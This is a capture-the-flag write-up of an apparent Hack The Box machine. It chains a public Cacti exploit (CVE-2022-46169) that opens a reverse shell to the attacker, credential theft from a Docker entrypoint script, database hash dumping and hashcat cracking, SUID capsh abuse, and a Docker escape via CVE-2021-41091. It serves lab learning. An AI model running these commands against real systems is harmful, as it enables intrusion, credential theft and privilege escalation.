# Summary: 
## foothold:
Vulnerable web service which results in a www-data shell inside a docker container.

## user:
using docker's `entrypoint.sh` script we're able to obtain DB credentials and dump all user's password hashes.

With `hashcat` its possible to crack one of the hashes and get user credentials for SSH.

## root:
Upon logging in with the user to SSH, we see a prompt for `you have mail`. checking the mail shows that the system is vulnerable to several CVE's.

One of the CVE's is about `moby` an open framework created by Docker to assemble specialized container systems.

With `www-data` shell we're able to escalate our privileges using SUID exploitation on `capsh`, and change the permissions of `/bin/bash` inside the container.

Which in turn un-privileged users on host machine can find and execute said SUID binary (`/bin/bash`).

### PORT 80
visiting port 80 we see a login prompt with Version and software name available.

![](_images/Pasted%20image%2020230902160102.png)


searching on google the software and version we're able to find an exploit on github. 


![](_images/Pasted%20image%2020230902160030.png)

https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22

The exploit requires url, local host and local port. for a reverse shell endpoint.

![](_images/Pasted%20image%2020230902160445.png)

executing `python3 CVE-2022-46169.py -u http://10.129.109.77/ --LHOST=10.10.16.7 --LPORT=80`

![](_images/Pasted%20image%2020230902160402.png)


should give us a shell as www-data user.

# USER
## System enumeration
after a quick glimpse it seems we're inside a docker container.

![](_images/Pasted%20image%2020230902160546.png)


which in turn means there could be an entry script on root directory

![](_images/Pasted%20image%2020230902162019.png)

which there is.

checking the contents reveals credentials for the database.

![](_images/Pasted%20image%2020230902161019.png)

## DB enumeration
in order to interact with the DB we need a "full" shell. 
couldn't find python on system, `script` is another way to get a full interactive shell. 
```
script /dev/null -qc /bin/bash
(inside the nc session) CTRL+Z
stty raw -echo; fg;
```

with the shell we're able to login to the db. with the following command.
```
mysql --host=db --user=root --password=root cacti
```

![](_images/Pasted%20image%2020230902161555.png)

next thing to do is to check which tables are available.

![](_images/Pasted%20image%2020230902161609.png)


`user_auth` is interesting.

![](_images/Pasted%20image%2020230902161623.png)


selecting the contents of the table, we get hashes for `admin` and `marcus`

![](_images/Pasted%20image%2020230902161640.png)

## Cracking hashes
the hashes:
```
admin $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC
marcus $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C
```

now we can use hashcat to crack the hashes.
```
hashcat -d 1 -m 3200 hashes/HTB/MonitorTwo.txt rockyou.txt
```
cracked hash:
```
$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C:funkymonkey
```

The cracked hash belongs to marcus.
since SSH port is open we can try these credentials.

![](_images/Pasted%20image%2020230902162834.png)

which indeed are valid.

# ROOT
### Potential LPE
when connecting with SSH we get a prompt that we have mail.

![](_images/Pasted%20image%2020230902162855.png)

mail will be saved on `/var/mail/<USER>`

![](_images/Pasted%20image%2020230902163017.png)


![](_images/Pasted%20image%2020230902163038.png)

reading the mail we can conclude that there are couple vulnerabilities on the system.
checking `CVE-2021-41091` exploit, which is an exploit for moby for software containerization by docker.
searching online we're able to find an exploit available on github 

![](_images/Pasted%20image%2020230902163344.png)

The exploit will check if the host is vulnerable and iterate over the available overlay2 filesystems. If the system is indeed vulnerable
but before running the exploit we got to get root on the docker session, and change the permissions of `/bin/bash`. then run the exploit from host machine. 
the script will attempt to gain root access by spawning a shell in the vulnerable path (the filesystem of the Docker container where you executed the setuid command on /bin/bash).
This CVE requires root on docker container in order to exploit.

![](_images/Pasted%20image%2020230902163902.png)



### Root on docker
after searching for vulnerabilities in the docker container, I've found that there is binary with SUID.

![](_images/Pasted%20image%2020230902164728.png)


`/sbin/capsh`  has SUID bit on.

![](_images/Pasted%20image%2020230902165019.png)

using GTFO bin we can exploit the SUID bit.

https://gtfobins.github.io/gtfobins/capsh/

![](_images/Pasted%20image%2020230902165352.png)


so basically running `/sbin/capsh --gid=0 --uid=0 --`
should result in root shell

![](_images/Pasted%20image%2020230902165527.png)

next is to set SUID bit on /bin/bash

![](_images/Pasted%20image%2020230902165602.png)


the only thing left to do is to run the exploit from the host machine.
### Root on host

![](_images/Pasted%20image%2020230902163612.png)

so we're gonna download the exploit using python server(from my attack machine).

![](_images/Pasted%20image%2020230902165755.png)



![](_images/Pasted%20image%2020230902165713.png)


running the exploit:

![](_images/Pasted%20image%2020230902165937.png)

the exploit didn't spawn us a root shell, but showed the vulnerable path to `/bin/bash` 

![](_images/Pasted%20image%2020230902170009.png)


now running `/bin/bash -p` from that path will grant us root user.
